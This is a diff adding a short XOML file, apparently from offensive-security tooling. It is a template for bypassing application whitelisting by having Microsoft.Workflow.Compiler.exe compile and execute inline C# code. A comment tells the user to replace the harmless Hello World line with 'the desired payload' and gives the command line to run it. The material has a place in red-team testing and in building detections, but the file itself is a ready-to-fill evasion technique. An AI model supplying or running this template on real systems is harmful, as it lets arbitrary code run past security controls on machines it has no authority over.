@@ -1,0 +1,22 @@
+<!--
+  XOML payload for Microsoft.Workflow.Compiler bypass.
+
+  The SequentialWorkflowActivity contains inline C# code that is
+  compiled and executed at runtime. Replace the Console.WriteLine
+  with the desired payload.
+
+  Usage (pair with workflow_compiler_input.xml):
+    Microsoft.Workflow.Compiler.exe test.xml output.xml
+-->
+<SequentialWorkflowActivity x:Class="Workflow" x:Name="Workflow"
+    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/workflow">
+    <CodeActivity x:Name="CodeActivity" />
+    <x:Code>
+        <![CDATA[
+            public class Test : SequentialWorkflowActivity {
+                public Test() { Console.WriteLine("Hello World"); }
+            }
+        ]]>
+    </x:Code>
+</SequentialWorkflowActivity>
